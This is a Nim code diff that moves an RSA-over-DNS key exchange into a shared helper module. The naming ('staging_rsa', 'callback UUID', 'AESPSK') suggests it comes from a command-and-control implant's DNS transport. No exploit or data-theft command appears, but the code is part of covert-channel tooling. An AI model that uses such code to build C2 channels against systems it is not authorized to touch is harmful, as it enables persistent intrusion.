@@ -10,6 +10,7 @@ const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "f
 when encryptedExchange:
   import std/base64
   import ../utils/rsa
+  import ../utils/key_exchange
 
 type
   DnsRecordType* = enum
@@ -1216,76 +1217,22 @@ proc performKeyExchange*(profile: var DnsProfile): tuple[success: bool, newUuid:
     debug "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
     return (true, "")
   
-  # Check if RSA is available
+  # Use shared key exchange implementation
   when encryptedExchange:
-    if not isRsaAvailable():
-      debug "[DEBUG] RSA key exchange not available: OpenSSL not found"
-      return (true, "")
+    # Create a send wrapper that matches the expected signature
+    var p = profile  # Create capturable local reference
+    proc sendWrapper(data: string, uuid: string): string =
+      return p.send(data, uuid)
     
-    debug "[DEBUG] === PERFORMING RSA KEY EXCHANGE VIA DNS ==="
-    try:
-      # Generate RSA 4096-bit key pair
-      debug "[DEBUG] Generating RSA 4096-bit key pair..."
-      var rsaKey = generateRsaKeyPair(4096)
-      if not rsaKey.available:
-        debug "[DEBUG] RSA key generation failed"
-        return (false, "")
-      
-      # Generate session ID
-      randomize()
-      var sessionId = newString(20)
-      for i in 0..19:
-        sessionId[i] = char(rand(25) + ord('a'))
-      
-      debug "[DEBUG] Session ID: ", sessionId
-      
-      # Build staging_rsa message
-      let stagingMsg = %*{
-        "action": "staging_rsa",
-        "pub_key": encode(rsaKey.publicKeyPem),
-        "session_id": sessionId
-      }
-      let stagingStr = $stagingMsg
-      
-      debug "[DEBUG] Sending staging_rsa via DNS..."
-      let response = profile.send(stagingStr, profile.config.uuid)
-      
-      if response.len == 0:
-        debug "[DEBUG] Key exchange failed: empty response"
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      
-      # Parse response
-      let respJson = parseJson(response)
-      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
-        debug "[DEBUG] Key exchange failed: missing fields"
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      
-      let encryptedSessionKey = decode(respJson["session_key"].getStr())
-      let newUuid = respJson["uuid"].getStr()
-      
-      debug "[DEBUG] New callback UUID: ", newUuid
-      
-      # Decrypt session key
-      let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
-      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
-      if decryptedKey.len == 0:
-        debug "[DEBUG] RSA decryption failed"
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      
-      # Set AES key
-      var aesKey = decryptedKey
-      if aesKey.len > 32:
-        aesKey.setLen(32)
-      
-      profile.setAesKey(aesKey)
-      freeRsaKeyPair(rsaKey)
-      
-      debug "[DEBUG] RSA key exchange via DNS completed successfully"
-      return (true, newUuid)
-      
-    except:
-      debug "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
+    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
+    
+    if result.success and result.sessionKey.len > 0:
+      # Set the AES key
+      profile.setAesKey(result.sessionKey)
+      return (true, result.newUuid)
+    elif result.success:
+      # No key exchange needed (AESPSK mode)
+      return (true, "")
+    else:
+      debug "[DEBUG] Key exchange failed: ", result.error
       return (false, "")
